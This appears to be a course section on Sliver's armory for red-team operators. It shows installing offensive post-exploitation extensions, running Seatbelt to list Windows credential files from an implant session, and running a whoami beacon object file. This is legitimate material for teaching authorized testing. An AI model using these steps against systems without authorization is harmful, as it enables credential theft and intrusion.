# This course is intended for the 1.6 version of Sliver, which is not yet published

The Sliver armory is used to install and maintain third party extensions and aliases within sliver. The full list of available extensions can be found at https://github.com/sliverarmory/armory, keep in mind this is community maintained so not all modules are necessarily up to date. 

You can download all configured extensions/aliases using the armory command.

```bash
[server] sliver > armory install all
? Install 18 aliases and 84 extensions? Yes
[*] Installing alias 'SharpSecDump' (v0.0.1) ... done!
[*] Installing alias 'SharpChrome' (v0.0.1) ... done!
[*] Installing alias 'SharpDPAPI' (v0.0.1) ... done!
[*] Installing alias 'SharpMapExec' (v0.0.1) ... done!
[*] Installing alias 'KrbRelayUp' (v0.0.1) ... done!
[*] Installing alias 'SharpRDP' (v0.0.1) ... done!
[*] Installing alias 'SharpUp' (v0.0.1) ... done!
[*] Installing alias 'SharpView' (v0.0.1) ... done!
[*] Installing alias 'SharPersist' (v0.0.1) ... done!
[*] Installing alias 'Sharp WMI' (v0.0.2) ... done!
...
[*] All packages installed
```

These commands can then be used in the context of a session or beacon similarly to other commands, with a couple caveats.

Let’s go ahead and run our first assembly.

```bash
[server] sliver (UNABLE_PRIDE) > seatbelt " WindowsCredentialFiles"

[*] seatbelt output:

                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v1.1.1         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,

====== WindowsCredentialFiles ======

  Folder : C:\Users\defaultuser0\AppData\Local\Microsoft\Credentials\

   ...
```

As you can see Sliver ran the Seatbelt assembly and provided us with the output of our command.

## Bof’s

Beacon object files are loaded using trustedsec’s coffloader. When you run a bof command the loader will first be loaded into memory and is used to run whichever bof you choose. From an operator’s perspective bof’s are similar to basic sliver commands.

```bash
[server] sliver (UNABLE_PRIDE) > sa-whoami

[*] Successfully executed sa-whoami (coff-loader)
[*] Got output:

UserName		SID
====================== ====================================
test.local\tester

GROUP INFORMATION                                 Type                     SID                                          Attributes
================================================= ===================== ============================================= ==================================================
test.local\None                              Group                    S-1-5-21-3109228153-3872411817-1195593578-513 Mandatory group, Enabled by default, Enabled group,
Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Local account and member of Administrators groupWell-known group         S-1-5-114
BUILTIN\Administrators                            Alias                    S-1-5-32-544
BUILTIN\Performance Log Users                     Alias                    S-1-5-32-559                                  Mandatory group, Enabled by default, Enabled group,
BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group,
CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Local account                        Well-known group         S-1-5-113                                     Mandatory group, Enabled by default, Enabled group,
LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\NTLM Authentication                  Well-known group         S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group,
Mandatory Label\Medium Mandatory Level            Label                    S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group,

Privilege Name                Description                                       State
============================= ================================================= ===========================
SeShutdownPrivilege           Shut down the system                              Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled
SeUndockPrivilege             Remove computer from docking station              Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled
SeTimeZonePrivilege           Change the time zone                              Disabled
```

Since these payloads are run in-process, they have similar advantages and drawbacks as in-process assemblies, meaning no new processes are spawned on execution, but a crash risks losing the implant.
